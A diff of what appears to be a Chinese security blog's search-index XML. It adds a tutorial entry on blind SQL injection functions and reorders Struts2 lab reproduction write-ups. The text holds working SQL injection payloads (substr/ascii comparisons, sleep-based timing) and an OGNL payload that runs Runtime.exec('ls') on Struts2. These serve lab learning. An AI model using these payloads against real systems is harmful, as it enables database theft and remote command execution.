@@ -98,6 +98,75 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs-Background-2 盲注</title>
+    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-2%20%E7%9B%B2%E6%B3%A8(%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3)/</url>
+    <content><![CDATA[<h2 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h2><blockquote>
+<p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
+</blockquote>
+<p>从background-1 中，我们可以知道盲注分为三类 <strong>基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注</strong>。</p>
+<h2 id="基于布尔SQL盲注——构造逻辑判断"><a href="#基于布尔SQL盲注——构造逻辑判断" class="headerlink" title="基于布尔SQL盲注——构造逻辑判断"></a>基于布尔SQL盲注——构造逻辑判断</h2><h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid()函数"></a>mid()函数</h3><p>此函数为截取字符串一部分。<strong>MID(column_name,start[,length])</strong></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>column_name</td>
+<td>必需。要提取字符的字段</td>
+</tr>
+<tr>
+<td>start</td>
+<td>必需。规定开始位置（起始值是 1）</td>
+</tr>
+<tr>
+<td>length</td>
+<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本</td>
+</tr>
+</tbody></table>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MID(DATABASE(),1,1)&gt;’a’     &#x2F;&#x2F;数据库名第一位</span><br><span class="line">MID(DATABASE(),2,1)         &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure>
+<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure>
+<p>此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
+<h3 id="substr-函数和substring-函数"><a href="#substr-函数和substring-函数" class="headerlink" title="substr()函数和substring()函数"></a>substr()函数和substring()函数</h3><p><strong>Substr()</strong> 和 <strong>substring()</strong> 函数实现的功能是一样的，均为截取字符串。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string substring(string, start, length)</span><br><span class="line">string substr(string, start, length)</span><br></pre></td></tr></table></figure>
+
+<p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(DATABASE(),1,1)&gt;’a’  &#x2F;&#x2F;数据库名第一位</span><br><span class="line">substr(DATABASE(),2,1)      &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure>
+<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure>
+<p>此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
+<h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p><strong>Left()</strong> 得到字符串左部指定个数的字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(string,n)        &#x2F;&#x2F;string为要截取的字符串，n为长度。</span><br></pre></td></tr></table></figure>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(database(),1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure>
+<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
+<p>同样的，string可以为自行构造的SQL语句</p>
+<h3 id="ORD-函数和ascii-函数"><a href="#ORD-函数和ascii-函数" class="headerlink" title="ORD()函数和ascii()函数"></a>ORD()函数和ascii()函数</h3><p>返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(MID(DATABASE(),1,1))&gt;114</span><br><span class="line">ascii(MID(DATABASE(),1,1))&gt;114</span><br></pre></td></tr></table></figure>
+<p>意为检测<strong>database()</strong> 的第一位<strong>ASCII</strong>码是否大于114，也即是‘r’</p>
+<h3 id="regexp-函数"><a href="#regexp-函数" class="headerlink" title="regexp()函数"></a>regexp()函数</h3><p>正则注入此处不做详解可参考文章<br><a href="https://www.cnblogs.com/lcamry/articles/5717442.html">https://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
+<h2 id="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"></a>基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</h2><p><a href="https://bugs.mysql.com/bug.php?id=8652">mysql-bug #8652</a></p>
+<p>BUG #8652的主要内容就是在同时使用<strong>RAND()**函数，聚集函数</strong>COUNT()<strong>和</strong>GROUP BY**子句进行操作时会返回duplicate key 错误，而这个错误将会披露关键信息</p>
+<p>详细原理可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43249758/article/details/104168777">https://blog.csdn.net/weixin_43249758/article/details/104168777</a></p>
+<h2 id="基于时间的SQL盲注——延时注入"><a href="#基于时间的SQL盲注——延时注入" class="headerlink" title="基于时间的SQL盲注——延时注入"></a>基于时间的SQL盲注——延时注入</h2><p>使用sleep()函数<br>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure>
+<p>if判断语句，条件为假，执行sleep</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sleep(find_in_set(mid(@@version, 1, 1),&#39;0,1,2,3,4,5,6,7,8,9,.&#39;));</span><br></pre></td></tr></table></figure>
+<p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>
+]]></content>
+      <categories>
+        <category>sqli-labs靶场</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs靶场Less-1-4</title>
     <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-1-4/</url>
     <content><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><h3 id="验证存在SQL注入"><a href="#验证存在SQL注入" class="headerlink" title="验证存在SQL注入"></a>验证存在SQL注入</h3><p><strong><a href="http://47.101.62.20:11567/Less-1/?id=1">http://47.101.62.20:11567/Less-1/?id=1</a></strong> 后面直接添加一个’，报错</p>
@@ -424,24 +493,6 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-019 CVE-2013-4316复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
-<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>S2-029 CVE-2016-0785复现过程</title>
     <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
@@ -458,6 +509,44 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
 
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-046 CVE-2017-5638复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
+<a id="more"></a>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
+<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
+</li>
+<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-019 CVE-2013-4316复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
+<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
+</ol>
 ]]></content>
       <categories>
         <category>vulfocus靶场练习</category>
@@ -493,15 +582,15 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-046 CVE-2017-5638复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
+    <title>S2-052 CVE-2017-9805复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
 <a id="more"></a>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
-<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p>
 </li>
-<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
+<li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p>
 </li>
 </ol>
 ]]></content>
@@ -526,26 +615,6 @@
 
 <ol start="3">
 <li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-052 CVE-2017-9805复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p>
-</li>
-<li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p>
-</li>
 </ol>
 ]]></content>
       <categories>
